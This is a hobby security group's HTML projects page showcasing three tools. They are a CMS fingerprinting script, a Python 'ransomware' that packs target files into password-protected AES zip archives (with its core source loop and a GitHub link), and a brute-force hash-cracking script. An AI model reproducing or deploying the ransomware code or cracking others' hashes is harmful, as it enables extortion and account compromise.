<!DOCTYPE html>
<html>
<head>
	<title>HKG - PROJECTS</title>
	<meta name = "author" content = "Hamza Elansari" />
	<link rel = "icon" href = "img/hkgicon.png" type = "image/x-icon"/>
	<link rel="stylesheet" type="text/css" href="css/nav-bar.css">
	<link rel="stylesheet" type="text/css" href="css/home.css">
	<link rel="stylesheet" type="text/css" href="css/projects.css">
	<link rel="stylesheet" type="text/css" href="css/cybersec.css">
	<link rel="stylesheet" type="text/css" href="css/articls.css">
	<link rel="stylesheet" type="text/css" href="css/footer.css">
</head>
<body>
	<div class="menu">
		<ul>
			<li><a href="index.php">home</a></li>
			<li><a href="#" style="border-bottom: 5px solid rgb(120, 255, 140);color: rgb(120, 255, 140);">projects</a></li>
			<li><a href="cybersec.php">cyber security</a></li>
			<li id="right-nav">
				<form action="search.php">
					<input type="text" name="search" placeholder="search..." required>
				</form>
			</li>
		</ul>
	</div>
	<div class="projects-header">
		<h1>HKG - PROJECTS</h1><br>
		<h4>we are HKG members we talk to machines.</h4>
		<h2>HKG is place of open sources</h2>
		<p id="center-text">we are HKG, we trust just in open source, so that we building our projects and make it open source on our servers and our organization on github.<br>please fell free to use our projects, and we will be proud if you edited and helped us for devlopping our projects, have fun.<br>
		<a href="https://hkgang.com" target="_blank" id="articls">our articls website</a><br></p>
	</div>

	<div class="project1" id="cms-ripper">
		<h1>CMS-RIPPER</h1>
		<span class="author">Authors : Hamza Elansari - Salah Eddin</span>
		<h4>simple informations gathering tool, for education and security purpose.</h4>
		<h2>what is CMS ?</h2>
		<p>A CMS is an application that is used to manage and publish web content, allowing multiple users to contribute, create, edit, publish without having to beg a developer. It also provides version management and authoring workflow to keep large, global sites consistent.</p>
		<h2>about CMS-RIPPER</h2>
		<p>CMS-RIPPER is an open source tool wrotten with python3 made by HKG, the rull of this simple tool is discovering and gathering informations from the target website that its made itself by a CMS such as word press or joomla ..ect, <a href="https://github.com/hamza07/cmsriper" target="_blank" id="links">cms ripper on github</a>.</p>
		<a href="img/cms-ripper.jpg"><img id="pic" src="img/cms-ripper.jpg"></a>
		<h2>main source code</h2>
		<div class="source-code">
		    res=requests.get(f"https://whatcms.org/API/Tech?key={API_KEY}&url={url}")<br>
		    infos = res.json()["results"]<br>
		    print(f"CMS : {infos[0]['name']} {infos[0]['version']}")<br>
		    print(f"Programming Lang : {infos[1]['name']}")<br>
		    print(f"Databases : {infos[2]['name']}")<br>
		    print(f"Web Server : {infos[3]['name']}")<br>
		</div>
	</div>

	<div class="project2" id="ransomware">
		<h1>HKG RANSOMWARE</h1>
		<span class="author">Authors : Hamza Elansari - Abdelkarim mchklt</span>
		<h4>simple ransomware, for education and security purpose.</h4>
		<h2>about HK-GANG V 0.1</h2>
		<a href="img/index.jpg"><img style="float: right; margin-right: 15px;" id="pic" src="img/index.jpg"></a>
		<p>HK-GANG V 0.1 is simple ransomware build using python3, is based on zip compressing idea by a library called pyzipper, basicly is take the files targeted and compress them in .zip file closed by an encrypted password.<br>
		the goal behind this simple project its not to encrypt nasa data, its just to know about this new idea that we can encypt data using zip files even there are crackbable and week. <a href="https://github.com/hamza07/HK-GANG" target="_blank" id="links">Hkg-ransomware on github</a></p>
		<h2>main source code</h2>
		<div class="source-code">
		for j in range(len(directorys)):<br>
			with open(directorys[j], 'rb') as content:<br>
				rd = bytearray(content.read())<br><br>
			with pyzipper.AESZipFile(newFiles[j],<br>
	                		         'w',
	                        		 compression=pyzipper.ZIP_LZMA,
	                        		 encryption=pyzipper.WZ_AES) as zf:<br>
				zf.setpassword(self.secret_password)<br>
				zf.writestr(directorys[j], rd)<br>
		</div>
	</div>
	<div class="project1" id="cryptoghost">
		<h1>CRYPTOGHOST</h1>
		<span class="author">Authors : Abdelkarim mchklt</span>
		<h4>cryptoghost is a script for decrypt or decode your data</h4>
		<h2>about cryptoghost</h2>
		<p>Cryptoghost is a python script created by three important librarys (requests, hashlib, beautifulsoup from bs4) cryptoghost supports decryption / encryption / encoding / decoding . The decryption is important in cryptoghost i make tow methods for decryption : Methode 1 , bruteforce i give 100k words and passwords list for script and he try line by line he take a word word, he encrypted the word after he comparing if the ecnrypted word == the user hash . input Methode 2, he tak a userhash input and decrypted in site named hashtoolkit.</p>
		<h2>download and use</h2>
		<p>for download the script open the terminal and type the following</p>
		<div class="source-code">
			git clone https://github.com/mchklt/cryptoghost.git
		</div>
		<p>how to use cryptoghost<br>for encoding</p>
		<div class="source-code">
			python3 cryptoghost.py -e [TEXT]
		</div>
		<p>for decoding</p>
		<div class="source-code">
			python3 cryptoghost.pt -d [HASH]
		</div>
	</div>
	<footer>
		<?php include 'footer.php' ?>
	</footer>
</body>
</html>